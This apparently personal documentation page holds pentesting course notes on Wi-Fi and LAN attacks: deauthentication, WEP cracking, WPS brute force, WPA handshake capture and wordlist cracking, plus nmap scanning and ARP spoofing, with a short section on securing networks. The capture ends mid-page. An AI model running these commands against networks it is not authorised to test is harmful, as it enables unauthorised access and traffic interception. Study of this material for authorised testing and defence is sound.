<!DOCTYPE html>
<html class="writer-html5" lang="en" >
<head>
  <meta charset="utf-8" /><meta name="generator" content="Docutils 0.17.1: http://docutils.sourceforge.net/" />

  <meta name="viewport" content="width=device-width, initial-scale=1.0" />
  <title>Network Hacking &mdash; Caleb Sargeant&#39;s Docs 1.0.1 documentation</title>
      <link rel="stylesheet" href="../../_static/pygments.css" type="text/css" />
      <link rel="stylesheet" href="../../_static/css/theme.css" type="text/css" />
  <!--[if lt IE 9]>
    <script src="../../_static/js/html5shiv.min.js"></script>
  <![endif]-->
  
        <script data-url_root="../../" id="documentation_options" src="../../_static/documentation_options.js"></script>
        <script src="../../_static/jquery.js"></script>
        <script src="../../_static/underscore.js"></script>
        <script src="../../_static/_sphinx_javascript_frameworks_compat.js"></script>
        <script src="../../_static/doctools.js"></script>
        <script src="../../_static/sphinx_highlight.js"></script>
    <script src="../../_static/js/theme.js"></script>
    <link rel="index" title="Index" href="../../genindex.html" />
    <link rel="search" title="Search" href="../../search.html" />
    <link rel="next" title="Website Hacking" href="website-hacking.html" />
    <link rel="prev" title="Pentesting" href="index.html" /> 
</head>

<body class="wy-body-for-nav"> 
  <div class="wy-grid-for-nav">
    <nav data-toggle="wy-nav-shift" class="wy-nav-side">
      <div class="wy-side-scroll">
        <div class="wy-side-nav-search" >
            <a href="../../index.html" class="icon icon-home"> Caleb Sargeant's Docs
          </a>
<div role="search">
  <form id="rtd-search-form" class="wy-form" action="../../search.html" method="get">
    <input type="text" name="q" placeholder="Search docs" />
    <input type="hidden" name="check_keywords" value="yes" />
    <input type="hidden" name="area" value="default" />
  </form>
</div>
        </div><div class="wy-menu wy-menu-vertical" data-spy="affix" role="navigation" aria-label="Navigation menu">
              <p class="caption" role="heading"><span class="caption-text">Networking</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../networking/cisco/index.html">Cisco</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../networking/mikrotik.html">Mikrotik</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../networking/fortigate.html">FortiGate</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../networking/hp.html">HP Procurve</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../networking/juniper.html">Juniper</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../networking/ubiquiti-unifi.html">Ubiquiti UniFi</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../networking/netdevops-toolchest.html">NetDevOps Tool Chest</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Computing</span></p>
<ul class="current">
<li class="toctree-l1"><a class="reference internal" href="../ansible/index.html">Ansible</a></li>
<li class="toctree-l1"><a class="reference internal" href="../bamboo.html">Bamboo</a></li>
<li class="toctree-l1"><a class="reference internal" href="../cloud/index.html">Cloud</a></li>
<li class="toctree-l1"><a class="reference internal" href="../docker/index.html">Docker</a></li>
<li class="toctree-l1"><a class="reference internal" href="../kubernetes/index.html">Kubernetes</a></li>
<li class="toctree-l1"><a class="reference internal" href="../dns.html">DNS</a></li>
<li class="toctree-l1"><a class="reference internal" href="../elk-stack/index.html">ELK Stack</a></li>
<li class="toctree-l1"><a class="reference internal" href="../jenkins/index.html">Jenkins</a></li>
<li class="toctree-l1"><a class="reference internal" href="../linux/index.html">Linux</a></li>
<li class="toctree-l1 current"><a class="reference internal" href="index.html">Pentesting</a><ul class="current">
<li class="toctree-l2 current"><a class="current reference internal" href="#">Network Hacking</a><ul>
<li class="toctree-l3"><a class="reference internal" href="#intro">Intro</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#what-is-a-mac-address">What is a MAC Address?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#why-change-the-mac-address">Why Change the MAC Address?</a></li>
<li class="toctree-l4"><a class="reference internal" href="#changing-the-mac-address">Changing the MAC Address</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wireless-modes">Wireless Modes</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#pre-connection-attacks">Pre-Connection Attacks</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#packet-sniffing">Packet Sniffing</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wifi-bands">WiFi Bands</a></li>
<li class="toctree-l4"><a class="reference internal" href="#targeted-packet-sniffing">Targeted Packet Sniffing</a></li>
<li class="toctree-l4"><a class="reference internal" href="#deauthentication-attack">Deauthentication Attack</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#gaining-access-wep-cracking">Gaining Access - WEP Cracking</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#theory-behind-cracking-wep-encryption">Theory Behind Cracking WEP Encryption</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wep-cracking-basics">WEP Cracking Basics</a></li>
<li class="toctree-l4"><a class="reference internal" href="#fake-authentication-attack">Fake Authentication Attack</a></li>
<li class="toctree-l4"><a class="reference internal" href="#arp-request-replay-attack">ARP Request Replay Attack</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#gaining-access-wpa-wpa2-cracking">Gaining Access - WPA/WPA2 Cracking</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#id1">Intro</a></li>
<li class="toctree-l4"><a class="reference internal" href="#hacking-wpa-wpa2-without-a-wordlist">Hacking WPA &amp; WPA2 Without a Wordlist</a></li>
<li class="toctree-l4"><a class="reference internal" href="#capturing-the-handshake">Capturing the Handshake</a></li>
<li class="toctree-l4"><a class="reference internal" href="#creating-a-wordlist">Creating a Wordlist</a></li>
<li class="toctree-l4"><a class="reference internal" href="#cracking-wpa-wpa2-using-a-wordlist-attack">Cracking WPA &amp; WPA2 Using a Wordlist Attack</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#gaining-access-security">Gaining Access - Security</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#securing-your-network-from-hackers">Securing Your Network From Hackers</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#post-connection-attacks-information-gathering">Post Connection Attacks - Information Gathering</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#network-mapping">Network Mapping</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#post-connection-attacks-mitm">Post Connection Attacks - MiTM</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#arp-poisoning">ARP Poisoning</a></li>
<li class="toctree-l4"><a class="reference internal" href="#intercepting-network-traffic">Intercepting Network Traffic</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bettercap-basics">Bettercap Basics</a></li>
<li class="toctree-l4"><a class="reference internal" href="#arp-spoofing-using-bettercap">ARP Spoofing using Bettercap</a></li>
<li class="toctree-l4"><a class="reference internal" href="#spying-on-network-devices-capturing-passwords-etc">Spying on Network Devices (Capturing Passwords, etc.)</a></li>
<li class="toctree-l4"><a class="reference internal" href="#creating-custom-spoofing-script">Creating Custom Spoofing Script</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bypass-https">Bypass HTTPS</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bypassing-hsts">Bypassing HSTS</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bypassing-hsts-recap">Bypassing HSTS Recap</a></li>
<li class="toctree-l4"><a class="reference internal" href="#dns-spoofing">DNS Spoofing</a></li>
<li class="toctree-l4"><a class="reference internal" href="#injecting-javascript-code">Injecting Javascript Code</a></li>
<li class="toctree-l4"><a class="reference internal" href="#bettercap-web-interface">Bettercap Web Interface</a></li>
<li class="toctree-l4"><a class="reference internal" href="#wireshark">Wireshark</a></li>
</ul>
</li>
<li class="toctree-l3"><a class="reference internal" href="#detection-security">Detection &amp; Security</a><ul>
<li class="toctree-l4"><a class="reference internal" href="#arp-spoofing">ARP Spoofing</a></li>
<li class="toctree-l4"><a class="reference internal" href="#mitm-attacks">MITM Attacks</a></li>
</ul>
</li>
</ul>
</li>
<li class="toctree-l2"><a class="reference internal" href="website-hacking.html">Website Hacking</a></li>
<li class="toctree-l2"><a class="reference internal" href="gaining-access.html">Gaining Access</a></li>
<li class="toctree-l2"><a class="reference internal" href="post-exploitation.html">Post Exploitation</a></li>
</ul>
</li>
<li class="toctree-l1"><a class="reference internal" href="../terraform/index.html">Terraform</a></li>
<li class="toctree-l1"><a class="reference internal" href="../microsoft/index.html">Microsoft</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Programming</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../programming/bash.html">Bash</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../programming/python/index.html">Python</a></li>
</ul>
<p class="caption" role="heading"><span class="caption-text">Other</span></p>
<ul>
<li class="toctree-l1"><a class="reference internal" href="../../other/api/index.html">API</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../other/general/index.html">General</a></li>
<li class="toctree-l1"><a class="reference internal" href="../../other/iperf.html">iPerf3</a></li>
</ul>

        </div>
      </div>
    </nav>

    <section data-toggle="wy-nav-shift" class="wy-nav-content-wrap"><nav class="wy-nav-top" aria-label="Mobile navigation menu" >
          <i data-toggle="wy-nav-top" class="fa fa-bars"></i>
          <a href="../../index.html">Caleb Sargeant's Docs</a>
      </nav>

      <div class="wy-nav-content">
        <div class="rst-content">
          <div role="navigation" aria-label="Page navigation">
  <ul class="wy-breadcrumbs">
      <li><a href="../../index.html" class="icon icon-home"></a></li>
          <li class="breadcrumb-item"><a href="index.html">Pentesting</a></li>
      <li class="breadcrumb-item active">Network Hacking</li>
      <li class="wy-breadcrumbs-aside">
            <a href="../../_sources/computing/pentesting/network-hacking.rst.txt" rel="nofollow"> View page source</a>
      </li>
  </ul>
  <hr/>
</div>
          <div role="main" class="document" itemscope="itemscope" itemtype="http://schema.org/Article">
           <div itemprop="articleBody">
             
  <section id="network-hacking">
<h1>Network Hacking<a class="headerlink" href="#network-hacking" title="Permalink to this heading"></a></h1>
<section id="intro">
<h2>Intro<a class="headerlink" href="#intro" title="Permalink to this heading"></a></h2>
<ol class="loweralpha simple">
<li><p>Pre-connection attacks</p></li>
<li><p>gaining access</p></li>
<li><p>Post-connection attacks</p></li>
</ol>
<section id="what-is-a-mac-address">
<h3>What is a MAC Address?<a class="headerlink" href="#what-is-a-mac-address" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Media Access Control</p>
<blockquote>
<div><ul class="simple">
<li><p>Permanent</p></li>
<li><p>Physical</p></li>
<li><p>Unique</p></li>
</ul>
</div></blockquote>
</li>
<li><p>Assigned by manufacturer</p></li>
</ul>
</section>
<section id="why-change-the-mac-address">
<h3>Why Change the MAC Address?<a class="headerlink" href="#why-change-the-mac-address" title="Permalink to this heading"></a></h3>
<ul class="simple">
<li><p>Increase anonymity</p></li>
<li><p>Impersonate other devices</p></li>
<li><p>Bypass filters</p></li>
</ul>
</section>
<section id="changing-the-mac-address">
<h3>Changing the MAC Address<a class="headerlink" href="#changing-the-mac-address" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>ifconfig wlan0 down
ifconfig wlan0 hw ether <span class="m">00</span>:11:22:33:44:55
</pre></div>
</div>
</section>
<section id="wireless-modes">
<h3>Wireless Modes<a class="headerlink" href="#wireless-modes" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>iwconfig
ifconfig wlan0 down
airmon-ng check <span class="nb">kill</span>
iwconfig wlan0 mode monitor
iwconfig
</pre></div>
</div>
</section>
</section>
<section id="pre-connection-attacks">
<h2>Pre-Connection Attacks<a class="headerlink" href="#pre-connection-attacks" title="Permalink to this heading"></a></h2>
<section id="packet-sniffing">
<h3>Packet Sniffing<a class="headerlink" href="#packet-sniffing" title="Permalink to this heading"></a></h3>
<p>Using airodump-ng</p>
<ul class="simple">
<li><p>Part of the aircrack-ng suit</p></li>
<li><p>Airodump-ng is a packet sniffer</p></li>
<li><p>Used to capture all packets within range</p></li>
<li><p>Display detailed info about networks around us</p></li>
<li><p>Connected clients etc.</p></li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>airodump-ng <span class="o">[</span>MonitorModeInterface<span class="o">]</span>
</pre></div>
</div>
</section>
<section id="wifi-bands">
<h3>WiFi Bands<a class="headerlink" href="#wifi-bands" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Decides the frequency range that can be used</p></li>
<li><p>Determines the channels that can be used</p></li>
<li><p>Clients need to support band used by router to communicate with it.</p></li>
<li><p>Data can be sniffed from a certain band if the wireless adapter used supports that band</p></li>
<li><p>Most common wifi bands are:</p>
<blockquote>
<div><ul class="simple">
<li><p>a - uses 5Ghz frequency only</p></li>
<li><p>b, g - uses 2.4Ghz frequency only</p></li>
<li><p>n - uses 5 and 2.4 Ghz</p></li>
<li><p>ac - uses frequencies lower than 6 Ghz</p></li>
</ul>
</div></blockquote>
</li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>airodump-ng --band a mon0
airodump-ng --band abg mon0
</pre></div>
</div>
</section>
<section id="targeted-packet-sniffing">
<h3>Targeted Packet Sniffing<a class="headerlink" href="#targeted-packet-sniffing" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>airodump-ng --bssid F8:23:B2:B9:50:A8 --channel <span class="m">2</span> --write <span class="nb">test</span> mon0
</pre></div>
</div>
</section>
<section id="deauthentication-attack">
<h3>Deauthentication Attack<a class="headerlink" href="#deauthentication-attack" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Disconnect any client from any network</p>
<blockquote>
<div><ul class="simple">
<li><p>Works on encrypted networks (WEP, WPA, &amp; WPA2)</p></li>
<li><p>No need to know the network key</p></li>
<li><p>No need to connect to the network</p></li>
</ul>
</div></blockquote>
</li>
</ul>
<div class="highlight-default notranslate"><div class="highlight"><pre><span></span><span class="n">aireplay</span><span class="o">-</span><span class="n">ng</span> <span class="o">--</span><span class="n">dauth</span> <span class="p">[</span><span class="c1">#DeauthPackets] -a [NetworkMac] -c [TargetMac] [Interface]</span>
</pre></div>
</div>
</section>
</section>
<section id="gaining-access-wep-cracking">
<h2>Gaining Access - WEP Cracking<a class="headerlink" href="#gaining-access-wep-cracking" title="Permalink to this heading"></a></h2>
<section id="theory-behind-cracking-wep-encryption">
<h3>Theory Behind Cracking WEP Encryption<a class="headerlink" href="#theory-behind-cracking-wep-encryption" title="Permalink to this heading"></a></h3>
<ul class="simple">
<li><p>Wired Equivalent Privacy</p></li>
<li><p>Old encryption</p></li>
<li><p>Uses an algorithm called RC4</p></li>
<li><p>Still used in some networks</p></li>
<li><p>Can be cracked easily</p></li>
</ul>
<p><strong>WEP Cracking</strong></p>
<ul class="simple">
<li><p>Client encrypts data using a key</p></li>
<li><p>Encrypted packet sent in the air</p></li>
<li><p>Router decrypts packet using the key</p></li>
<li><p>Each packet is encrypted using a unique key stream</p></li>
<li><p>Random initialization vector (IV) is used to geenrate the keys streams</p></li>
<li><p>The IV is only 24 bits</p></li>
<li><p>IV + Key (Password ) = key stream</p></li>
<li><p>IV is too small (only 24 bits)</p></li>
<li><p>IV is sent in plain text</p></li>
</ul>
<p>Result:</p>
<ul class="simple">
<li><p>IVs will repeat on busy networks</p></li>
<li><p>This makes WEP vulnerable to statistical attacks</p></li>
<li><p>Repeated IVs can be used to determine the key stream</p></li>
<li><p>and break the encryption</p></li>
</ul>
</section>
<section id="wep-cracking-basics">
<h3>WEP Cracking Basics<a class="headerlink" href="#wep-cracking-basics" title="Permalink to this heading"></a></h3>
<p>Conclusion:</p>
<ul>
<li><p>To crack WEP we need to:</p>
<blockquote>
<div><ol class="arabic simple">
<li><p>capture a large number of packets/IVs - using <cite>airodump-ng</cite></p></li>
<li><p>Analyse the captured IVs and crack the key - using <cite>aircrack-ng</cite></p></li>
</ol>
</div></blockquote>
</li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>airodump-ng --bssid <span class="m">00</span>:11:22:33:44:55 --channel <span class="m">1</span> --write basic_wep mon0
aircrack-ng basic_wep-01.cap
<span class="c1"># Take the key found in brackets [ 41:73:32:33:70 ] or whatever and connect to wifi using the key minus the colons</span>
</pre></div>
</div>
</section>
<section id="fake-authentication-attack">
<h3>Fake Authentication Attack<a class="headerlink" href="#fake-authentication-attack" title="Permalink to this heading"></a></h3>
<p>Problem:</p>
<blockquote>
<div><ul class="simple">
<li><p>If network is not busy</p></li>
<li><p>It would take some time to capture enough IVs</p></li>
</ul>
</div></blockquote>
<p>Solution:</p>
<blockquote>
<div><ul class="simple">
<li><p>Force the AP to generate new IVs</p></li>
</ul>
</div></blockquote>
<p>Problem:</p>
<blockquote>
<div><ul>
<li><p>APs only communicate with connected clients.</p>
<blockquote>
<div><ul class="simple">
<li><p>We cant communicate with it</p></li>
<li><p>We cant even start the attack</p></li>
</ul>
</div></blockquote>
</li>
</ul>
</div></blockquote>
<p>Solution:</p>
<blockquote>
<div><ul class="simple">
<li><p>Associate with the AP before launcing the attack</p></li>
</ul>
</div></blockquote>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>airodump-ng --bssid <span class="m">00</span>:11:22:33:44:55 --channel <span class="m">6</span> --write arpreplay mon0
aireplay-ng --fakeauth <span class="m">0</span> -a <span class="o">[</span>targetAPMac<span class="o">]</span> -h <span class="o">[</span>MyMacAddressFirst8DigitsofUnspec<span class="o">]</span> mon0
</pre></div>
</div>
</section>
<section id="arp-request-replay-attack">
<h3>ARP Request Replay Attack<a class="headerlink" href="#arp-request-replay-attack" title="Permalink to this heading"></a></h3>
<ul class="simple">
<li><p>Wait for an ARP packet</p></li>
<li><p>Capture it, and replay it (retransmit it)</p></li>
<li><p>THis causes the AP to produce another packet with net IV</p></li>
<li><p>Keep doing this till we have enough IVs to crack the key</p></li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>airodump-ng --bssid <span class="m">00</span>:11:22:33:44:55 --channel <span class="m">6</span> --write arpreplay mon0
aireplay-ng --fakeauth <span class="m">0</span> -a <span class="o">[</span>targetAPMac<span class="o">]</span> -h <span class="o">[</span>MyMacAddressFirst8DigitsofUnspec<span class="o">]</span> mon0
aireplay-ng --arpreplay -b <span class="o">[</span>targetAPMac<span class="o">]</span> -h <span class="o">[</span>MyMacAddressFirst8DigitsofUnspec<span class="o">]</span> mon0
aireplay-ng --fakeauth <span class="m">0</span> -a <span class="o">[</span>targetAPMac<span class="o">]</span> -h <span class="o">[</span>MyMacAddressFirst8DigitsofUnspec<span class="o">]</span> mon0
aircrack-ng arpreplay-01.cap
</pre></div>
</div>
</section>
</section>
<section id="gaining-access-wpa-wpa2-cracking">
<h2>Gaining Access - WPA/WPA2 Cracking<a class="headerlink" href="#gaining-access-wpa-wpa2-cracking" title="Permalink to this heading"></a></h2>
<section id="id1">
<h3>Intro<a class="headerlink" href="#id1" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Both can be cracked using the same methods</p></li>
<li><p>Made to address the issues in WEP</p></li>
<li><p>Much more secure</p></li>
<li><p>Each packet is encrypted using a unique temporary key</p></li>
<li><p>Packets contain no useful information</p></li>
<li><p>WPS is a feature that can be used with WPA &amp; WPA2</p></li>
<li><p>Allows client to connect without the password</p></li>
<li><p>Authentication is done using an 8 digit pin</p>
<blockquote>
<div><ul class="simple">
<li><p>8 digits is very small</p></li>
<li><p>We can try all possible pins in relatively short time</p></li>
<li><p>Then the WPS pin can be used to compute the actual password</p></li>
</ul>
</div></blockquote>
</li>
<li><p>PS. this only works if the router is configured not to use PBC (Push Button Authentication)</p></li>
</ul>
</section>
<section id="hacking-wpa-wpa2-without-a-wordlist">
<h3>Hacking WPA &amp; WPA2 Without a Wordlist<a class="headerlink" href="#hacking-wpa-wpa2-without-a-wordlist" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Discover WPS networks</span>
wash --interface mon0

<span class="c1"># Run reaver</span>
reaver -bssid <span class="m">00</span>:11:22:33:44:55 --channel <span class="m">1</span> --interface mon0 -vvv --no-associate

<span class="c1"># Then do the auth attack</span>
airplay-ng --fakeauth <span class="m">30</span> -a <span class="o">[</span>targetRouterMAC<span class="o">]</span> -h <span class="o">[</span>myMACAddress<span class="o">]</span> mon0
</pre></div>
</div>
</section>
<section id="capturing-the-handshake">
<h3>Capturing the Handshake<a class="headerlink" href="#capturing-the-handshake" title="Permalink to this heading"></a></h3>
<ul>
<li><p>WPA fixed all weaknesses in WEP</p></li>
<li><p>Packets contain no useful data</p></li>
<li><p>Only packets that can aid with the cracking process are the handshake packets</p>
<blockquote>
<div><ul class="simple">
<li><p>These are 4 packets sent when a client connects to the network</p></li>
</ul>
</div></blockquote>
</li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Run airodump as usual to get the BSSID and channel</span>
<span class="c1"># Then run airodump again</span>
airodmp-ng --bssid <span class="m">00</span>:11:22:33:44:55 --channel <span class="m">1</span> --write wpa_handshake mon0
<span class="c1"># Wait for a device to connect or do a deauth attack to disconnect a client to get it to connect again to capture handshake packets</span>
aireplay-ng --deauth <span class="m">4</span> -a <span class="m">00</span>:11:22:33:44:55 -c <span class="o">[</span>clientsMACAddress<span class="o">]</span> mon0
</pre></div>
</div>
</section>
<section id="creating-a-wordlist">
<h3>Creating a Wordlist<a class="headerlink" href="#creating-a-wordlist" title="Permalink to this heading"></a></h3>
<ul class="simple">
<li><p>The handshake does not contain data that helps recover the key</p></li>
<li><p>It contains data that can be used to check if a key is valid or not</p></li>
</ul>
<p>Crunch can be used to create a wordlist</p>
<ul>
<li><p>Syntax: <cite>crunch [min] [max] [characters] -t [pattern] -o [filename]</cite></p></li>
<li><p>Example: <cite>crunch 6 8 123abc$ -o wordlist -t a&#64;&#64;&#64;&#64;b</cite></p></li>
<li><p>Generated passwords:</p>
<blockquote>
<div><ul class="simple">
<li><p>aaaaab</p></li>
<li><p>aabbbb</p></li>
<li><p>aan$$b</p></li>
</ul>
</div></blockquote>
</li>
<li><p>Links to wordlists</p>
<blockquote>
<div><ul class="simple">
<li><p><a class="reference external" href="ftp://ftp.openwall.com/pub/wordlists/">ftp://ftp.openwall.com/pub/wordlists/</a></p></li>
<li><p><a class="reference external" href="http://www.openwall.com/mirrors/">http://www.openwall.com/mirrors/</a></p></li>
<li><p><a class="reference external" href="https://github.com/danielmiessler/SecLists">https://github.com/danielmiessler/SecLists</a></p></li>
<li><p><a class="reference external" href="http://www.outpost9.com/files/WordLists.html">http://www.outpost9.com/files/WordLists.html</a></p></li>
<li><p><a class="reference external" href="http://www.vulnerabilityassessment.co.uk/passwords.htm">http://www.vulnerabilityassessment.co.uk/passwords.htm</a></p></li>
<li><p><a class="reference external" href="http://packetstormsecurity.org/Crackers/wordlists/">http://packetstormsecurity.org/Crackers/wordlists/</a></p></li>
<li><p><a class="reference external" href="http://www.ai.uga.edu/ftplib/natural-language/moby/">http://www.ai.uga.edu/ftplib/natural-language/moby/</a></p></li>
<li><p><a class="reference external" href="http://www.cotse.com/tools/wordlists1.htm">http://www.cotse.com/tools/wordlists1.htm</a></p></li>
<li><p><a class="reference external" href="http://www.cotse.com/tools/wordlists2.htm">http://www.cotse.com/tools/wordlists2.htm</a></p></li>
<li><p><a class="reference external" href="http://wordlist.sourceforge.net/">http://wordlist.sourceforge.net/</a></p></li>
</ul>
</div></blockquote>
</li>
</ul>
</section>
<section id="cracking-wpa-wpa2-using-a-wordlist-attack">
<h3>Cracking WPA &amp; WPA2 Using a Wordlist Attack<a class="headerlink" href="#cracking-wpa-wpa2-using-a-wordlist-attack" title="Permalink to this heading"></a></h3>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>aircrack-ng wpa_handshake-01.cap -w test.txt
</pre></div>
</div>
</section>
</section>
<section id="gaining-access-security">
<h2>Gaining Access - Security<a class="headerlink" href="#gaining-access-security" title="Permalink to this heading"></a></h2>
<section id="securing-your-network-from-hackers">
<h3>Securing Your Network From Hackers<a class="headerlink" href="#securing-your-network-from-hackers" title="Permalink to this heading"></a></h3>
<p>Now that we know how to test the security of all known wireless encryptions (WEP/WPA/WPA2), it is relatively easy to secure our networks against these attacks as we know all the weaknesses that can be used by hackers to crack these encryptions.</p>
<p>So lets have a look on each of these encryptions one by one:</p>
<ol class="arabic simple">
<li><p>WEP: WEP is an old encryption, and its really weak, as we seen in the course there are a number of methods that can be used to crack this encryption regardless of the strength of the password and even if there is nobody connected to the network. These attacks are possible because of the way WEP works, we discussed the weakness of WEP and how it can be used to crack it, some of these methods even allow you to crack the key in a few minutes.</p></li>
<li><p>WPA/WPA2: WPA and WPA2 are very similar, the only difference between them is the algorithm used to encrypt the information but both encryptions work in the same way. WPA/WPA2 can be cracked in two ways</p>
<ol class="arabic simple">
<li><p>If WPS feature is enabled then there is a high chance of obtaining the key regardless of its complexity, this can be done by exploiting a weakness in the WPS feature. WPS is used to allow users to connect to their wireless network without entering the key, this is done by pressing a WPS button on both the router and the device that they want to connect, the authentication works using an eight digit pin, hackers can brute force this pin in relatively short time (in an average of 10 hours), once they get the right pin they can use a tool called reaver to reverse engineer the pin and get the key, this is all possible due to the fact that the WPS feature uses an easy pin (only 8 characters and only contains digits), so its not a weakness in WPA/WPA2, its a weakness in a feature that can be enabled on routers that use WPA/WPA2 which can be exploited to get the actual WPA/WPA2 key.</p></li>
<li><p>If WPS is not enabled, then the only way to crack WPA/WPA2 is using a dictionary attack, in this attack a list of passwords (dictionary) is compared against a file (handshake file) to check if any of the passwords is the actual key for the network, so if the password does not exist in the wordlist then the attacker will not be able to find the password.</p></li>
</ol>
</li>
</ol>
<p>Conclusion:</p>
<ol class="arabic simple">
<li><p>Do not use WEP encryption, as we seen how easy it is to crack it regardless of the complexity of the password and even if there is nobody connected to the network.</p></li>
<li><p>Use WPA2 with a complex password, make sure the password contains small letters, capital letters, symbols and numbers and;</p></li>
<li><p>Ensure that the WPS feature is disabled as it can be used to crack your complex WPA2 key by brute-forcing the easy WPS pin.</p></li>
</ol>
</section>
</section>
<section id="post-connection-attacks-information-gathering">
<h2>Post Connection Attacks - Information Gathering<a class="headerlink" href="#post-connection-attacks-information-gathering" title="Permalink to this heading"></a></h2>
<ul>
<li><p>Discover all devices on the network</p></li>
<li><p>Display their</p>
<blockquote>
<div><ul class="simple">
<li><p>IP Address</p></li>
<li><p>MAC Address</p></li>
<li><p>OS</p></li>
<li><p>Open ports</p></li>
<li><p>Running services</p></li>
<li><p>Etc.</p></li>
</ul>
</div></blockquote>
</li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>netdiscover -r <span class="m">10</span>.0.2.1/24
</pre></div>
</div>
<section id="network-mapping">
<h3>Network Mapping<a class="headerlink" href="#network-mapping" title="Permalink to this heading"></a></h3>
<ul>
<li><p>HUGE security scanner</p></li>
<li><p>From an IP/IP range it can discover</p>
<blockquote>
<div><ul class="simple">
<li><p>Open ports</p></li>
<li><p>Running services</p></li>
<li><p>Operating system</p></li>
<li><p>Connected clients</p></li>
<li><p>Etc.</p></li>
</ul>
</div></blockquote>
</li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># You can also use the tool Zenmap</span>
nmap -T4 -A -v <span class="m">192</span>.168.1.1/24
nmap -T4 -F <span class="m">192</span>.168.1.1/24
nmap -sV -T4 -O -F --version-light <span class="m">192</span>.168.1.1/24
</pre></div>
</div>
</section>
</section>
<section id="post-connection-attacks-mitm">
<h2>Post Connection Attacks - MiTM<a class="headerlink" href="#post-connection-attacks-mitm" title="Permalink to this heading"></a></h2>
<section id="arp-poisoning">
<h3>ARP Poisoning<a class="headerlink" href="#arp-poisoning" title="Permalink to this heading"></a></h3>
<ul class="simple">
<li><p>Address Resolution Protocol</p></li>
<li><p>Simple protocol used to map IP Addresses of a machine to its MAC Address</p></li>
</ul>
<p>Why ARP spoofing is possible</p>
<blockquote>
<div><ol class="arabic simple">
<li><p>Client accept responses even if they did not send a request</p></li>
<li><p>Clients trust responses without any form or verification</p></li>
</ol>
</div></blockquote>
</section>
<section id="intercepting-network-traffic">
<h3>Intercepting Network Traffic<a class="headerlink" href="#intercepting-network-traffic" title="Permalink to this heading"></a></h3>
<p>Arpspoof</p>
<blockquote>
<div><ul class="simple">
<li><p>arpspoof tool to run arp spoofing attacks</p></li>
<li><p>Simple and reliable</p></li>
<li><p>Ported to most operating systems including Android and iOS</p></li>
<li><p>Usage is always the same</p></li>
</ul>
</div></blockquote>
<p>Usage:</p>
<blockquote>
<div><ul class="simple">
<li><p>arpspoof -i [interface] -t [clientIP] [gatewayIP]</p></li>
<li><p>arpspoof -i [interface] -t [gatewayIP] [clientIP]</p></li>
</ul>
</div></blockquote>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span><span class="c1"># Enable ip forwarding</span>
<span class="nb">echo</span> <span class="m">1</span> &gt; /proc/sys/net/ipv4/ip_forward
</pre></div>
</div>
</section>
<section id="bettercap-basics">
<h3>Bettercap Basics<a class="headerlink" href="#bettercap-basics" title="Permalink to this heading"></a></h3>
<ul>
<li><p>Framework to run network attacks</p></li>
<li><p>Can be used to</p>
<blockquote>
<div><ul class="simple">
<li><p>ARP Spoof targets (redirect the flow of packets)</p></li>
<li><p>Sniff data (urls, usernam passwords)</p></li>
<li><p>Bypass HTTPS</p></li>
<li><p>Redirect domain requests (DNS spoofing)</p></li>
<li><p>Inject code into loaded pages</p></li>
<li><p>And more</p></li>
</ul>
</div></blockquote>
</li>
<li><p>usage: <cite>bettercap -iface [interface]</cite></p></li>
</ul>
<div class="highlight-bash notranslate"><div class="highlight"><pre><span></span>net.probe on
net.show
</pre></div>
</div>
</section>
<section id="arp-spoofing-using-bettercap">
